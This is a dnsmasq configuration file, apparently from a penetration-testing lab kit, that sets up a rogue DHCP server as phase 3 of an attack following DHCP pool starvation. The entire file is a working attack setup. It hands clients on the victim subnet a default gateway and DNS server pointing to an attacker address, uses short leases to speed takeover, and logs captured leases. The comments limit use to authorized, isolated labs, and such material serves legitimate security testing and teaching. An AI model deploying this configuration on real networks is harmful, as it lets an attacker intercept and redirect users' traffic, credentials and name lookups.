# Phase 3 - rogue DHCP server (dnsmasq).
# Run this after the real server's pool is drained (phase 2). It answers new
# DHCP requests and gives clients a gateway + DNS pointing at the attacker, so
# their traffic goes through us. Edit the interface, range and option 3/6 IPs to
# match your lab before running. Authorized, isolated networks only - see ../../DISCLAIMER.md.

# only listen on the interface facing the victims
interface=eth0
bind-interfaces

# DHCP only, don't act as a DNS resolver (comment out to also serve DNS)
port=0

# address range on the victim subnet + short lease so clients re-request often
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,2m

# answer even without a full handshake / win races
dhcp-authoritative

# option 3 = default gateway -> attacker IP
dhcp-option=3,192.168.1.66
# option 6 = DNS server -> attacker IP
dhcp-option=6,192.168.1.66

# logging, handy for the report
log-dhcp
dhcp-leasefile=/var/lib/misc/rogue-dnsmasq.leases
